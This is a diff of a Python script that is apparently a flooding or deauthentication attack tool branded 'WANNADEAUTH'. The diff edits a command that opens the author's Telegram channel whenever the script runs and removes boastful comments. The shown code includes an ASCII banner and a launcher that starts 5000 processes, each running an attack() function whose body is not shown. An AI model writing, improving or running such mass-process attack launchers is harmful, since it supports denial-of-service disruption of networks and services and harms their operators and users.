@@ -17,7 +17,7 @@ if os.name == 'nt':
   webbrowser.open("https://t.me/WANNADEAUTH", new=1)
 else:
   os.system("clear")
-  os.system("termux-open-url https://WANNADEAUTH")
+  os.system("termux-open-url https://t.me/WANNADEAUTH")
 
 print(f"{r}db   d8b   db  .d8b.  d8b   db d8b   db  .d8b.  {y}d8888b.  .d88b.  .d8888.") 
 print(f"{r}88   I8I   88 d8' `8b 888o  88 888o  88 d8' `8b {y}88  `8D .8P  Y8. 88'  YP")
@@ -73,12 +73,12 @@ def attack():
 
 
 def send2attack():
-  for i in range(5000): #Magic Power
+  for i in range(5000): 
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
-    mp.start() #Magic Starts
+    mp.start() 
 
-send2attack() #61 lines for the most powerful attack, cool?
+send2attack() 
 
 # @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
 # @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
